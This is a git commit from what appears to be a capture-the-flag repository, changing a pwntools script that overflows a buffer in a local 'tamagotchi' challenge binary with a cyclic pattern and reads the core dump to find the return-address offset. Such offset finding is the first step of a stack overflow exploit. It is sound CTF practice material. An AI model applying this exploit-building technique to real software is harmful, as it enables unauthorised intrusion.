2682a5c60f952c05de189e3b8a1ef900544499be
Loevland <34869848+Loevland@users.noreply.github.com>
2022-12-30 09:26:46 +0100

    Tamagotchi (#88)
    * Added Pwn/Ollivanders
    
    * Tamagotchi :cow:
    
    * Update README.md
    
    * Update README.md
    
    * Update find_offset.py
    
    * Update find_offset.py

--- Pwn/tamagotchi/find_offset.py
+++ Pwn/tamagotchi/find_offset.py
@@ -1,14 +1,16 @@
 from pwn import *
 
-elf = ELF("./mp3_player", checksec=False)
+elf = ELF("./tamagotchi", checksec=False)
 p = elf.process()
 
 # Overflow the buffer
-p.recvuntil(b"ABBA")
+p.recvuntil(b">> ")
+p.sendline(b"2")
+p.recvuntil(b">> ")
 p.sendline(cyclic(150))
 p.wait()
 
 # Read corefile to get RIP offset
 core = p.corefile
 offset = cyclic_find(core.read(core.rsp, 4))
-print(offset)
+log.success(f"Offset is {offset}")
